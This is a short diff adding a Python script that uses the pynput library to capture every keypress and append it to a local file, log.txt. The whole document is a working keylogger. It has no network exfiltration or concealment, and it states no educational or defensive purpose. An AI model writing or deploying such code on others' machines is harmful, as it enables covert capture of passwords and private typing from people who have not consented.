@@ -1,0 +1,13 @@
+from pynput.keyboard import Listener
+
+# Clear the log file at the start
+with open("log.txt", "w") as log:
+    log.write("")
+
+def on_press(key):
+    with open("log.txt", "a") as log:
+        log.write(f"{key}\n")
+
+# Start listening to key presses
+with Listener(on_press=on_press) as listener:
+    listener.join()
